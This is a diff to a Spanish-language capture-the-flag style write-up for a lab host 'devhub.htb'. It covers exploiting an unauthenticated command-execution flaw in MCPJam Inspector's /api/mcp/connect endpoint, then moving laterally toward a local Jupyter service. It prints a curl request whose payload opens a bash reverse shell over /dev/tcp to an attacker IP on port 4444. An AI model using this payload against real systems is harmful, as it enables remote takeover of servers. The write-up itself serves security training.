@@ -37,30 +37,11 @@ curl -sv http://devhub.htb:6274/api/mcp/connect
 
 El dashboard de MCPJam es accesible desde el browser en `http://devhub.htb:6274`, exponiendo las rutas `/#servers`, `/#chat-v2` y `/#settings`.
 
----
-
 ## Análisis de Vulnerabilidades
 
 ### CVE-2026-23744 — MCPJam Inspector v1.4.2 RCE
 
 MCPJam Inspector en versiones <= 1.4.2 expone el endpoint `/api/mcp/connect` sin autenticación. El parámetro `serverConfig` acepta un comando arbitrario que el servidor ejecuta directamente, sin validación de input.
-
-**Verificación del endpoint:**
-
-```bash
-curl http://devhub.htb:6274/api/mcp/connect \
-  -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"echo","args":["hello world"],"env":{}},"serverId":"test"}'
-```
-
-Respuesta:
-
-{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}
-```
-
-El error `Connection closed` confirma que el comando se ejecutó — `echo` termina inmediatamente sin mantener la conexión MCP, pero la ejecución ocurrió.
-
----
 
 ## Explotación — Acceso Inicial
 
@@ -76,20 +57,14 @@ Payload:
 curl http://devhub.htb:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.87/4444 0>&1"],"env":{}},"serverId":"pwned"}'
-```
-
-Shell obtenida como usuario `mcp-dev`.
-
----
 
 ## Movimiento Lateral — mcp-dev → analyst
 
 ### Identificación de Jupyter en localhost
 
-```bash
 curl -s http://127.0.0.1:8888/api
 # {"version": "2.17.0"}
-```
+
 
 Jupyter Lab corre internamente en el puerto 8888. Para acceder desde Kali se configura un túnel con Chisel.
 
